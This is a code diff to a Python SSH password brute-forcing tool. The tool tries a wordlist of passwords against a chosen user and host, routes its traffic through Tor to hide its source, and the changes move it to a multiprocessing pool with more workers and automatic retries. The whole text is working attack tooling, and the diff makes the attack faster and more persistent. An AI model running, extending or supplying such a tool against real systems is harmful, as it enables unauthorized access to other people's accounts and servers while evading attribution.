@@ -4,6 +4,7 @@
 
 import atexit
 import argparse
+import multiprocessing
 import os
 try:
 	import paramiko
@@ -27,9 +28,14 @@ except:
 	print(' [-] Error: requires socks/SocksiPy/PySocks (pip3 install PySocks)')
 	os._exit(1)
 import sys
-from threading import Thread
 from time import sleep
-from queue import Queue
+
+
+class error(Exception):
+	pass
+
+class notfound(Exception):
+	pass
 
 
 def cls():
@@ -47,26 +53,36 @@ def exit_handler():
 
 
 def ssh_connect(password, code = 0):
-	global running, verbose
+	global verbose
+	if (password=="^^^break^^^"):
+		raise notfound
+		sys.exit(1)
 	paramiko.util.log_to_file(".logs/paramiko.log")
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	if verbose == True:
 		print(' [*] Testing password: ' + password)
 	try:
-		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password)
+		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password, timeout=10)
 	except paramiko.AuthenticationException:
-		running -= 1
 		if verbose == True:
 			print(' [-] Password ' + password + ' incorrect.')
-		return running
+		ssh.close()
+		sys.exit(1)
 	except socket.error as e:
-		print(' [-] Socket error. ')
-		os._exit(1)
-	running -= 1
+		print(' [-] Socket error. Retrying...')
+		ssh_connect(password)
+		ssh.close()
+		sys.exit(1)
+	except paramiko.ssh_exception.SSHException:
+		print(' [-] Unable to get SSH Banner. Retrying...')
+		ssh_connect(password)
+		ssh.close()
+		sys.exit(1)
 	ssh.close()
 	print(' [+] Password for ' + tgtUser + ' found: ' + password)
 	exit_handler()
+	raise error
 	os._exit(1)
 
 
@@ -93,12 +109,11 @@ def main():
 	parser.add_argument('-t', '--tgtPort', type=int, help='port to attack on target machine (optional: default 22)', default=22)
 	parser.add_argument('tgtUser', type=str, help='target username')
 	parser.add_argument('dictFile', type=str, help='dictionary file or password list to use')
-	parser.add_argument('-m', '--maxThreads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 10)', default=4)
+	parser.add_argument('-m', '--maxThreads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 16)', default=4)
 	parser.add_argument('-P', '--torPort', type=int, help='local Tor port (optional: default 9050)', default=9050)
 	parser.add_argument('-v', '--verbose', action="store_true", help='display status at each step')
 	args = parser.parse_args()
-	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads, verbose, running
-	running = 0
+	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads, verbose, worker
 	tgtUser = args.tgtUser
 	dictFile = args.dictFile
 	tgtPort = args.tgtPort
@@ -112,9 +127,9 @@ def main():
 			print(" [-] Cannot resolve '%s': Unknown host\n" % args.tgtHost)
 			exit(0)
 	torPort = args.torPort
-	if (args.maxThreads > 10):
-		print(' [-] Maximum number of threads can not exceed 10.')
-		maxThreads = 10
+	if (args.maxThreads > 16):
+		print(' [-] Maximum number of threads can not exceed 16.')
+		maxThreads = 16
 	elif (args.maxThreads < 1):
 		print(' [-] Maximum number of threads must be greater than 0 (come on, now.)')
 		maxThreads = 4
@@ -146,20 +161,26 @@ def main():
 	paramiko.client.socket.socket = socks.socksocket
 	input_file = open(dictFile)
 	running = 0
-	q = Queue(maxsize=0)
+	password = []
 	for j in input_file.readlines():
-		password = j.strip('\n')
-		q.put(password)
+		password.append(j.strip('\n'))
+	password.append("^^^break^^^")
 	print("\n [+] Let's hack the Gibson.\n")
-	while (q.qsize() > 0):
-		if running < maxThreads:
-			running += 1
-			passW = q.get()
-			worker = Thread(target=ssh_connect, args=(passW,))
-			worker.start()
-			sleep(1.25) #allow time for ssh banners to be properly captured, if the delay is too short it causes read errors which can cause the script to skip submitting some passwords
+
+	worker = multiprocessing.Pool(maxThreads, maxtasksperchild=1)
+	try:
+		list(worker.map(ssh_connect, password))
+	except error:
+		worker.terminate()
+		os._exit(1)
+	except notfound:
+		worker.terminate()
+	else:
+		worker.close()
+		worker.join()
+
 	print(' [+] Reached end of dictionary file, waiting for threads to complete...')
-	sleep(running*2) #give the script 2 seconds per running thread to finish pulling banners and checking them before declaring no password found
+	sleep(1)
 	print(' [+] Password not found; Shutting down.')
 
 
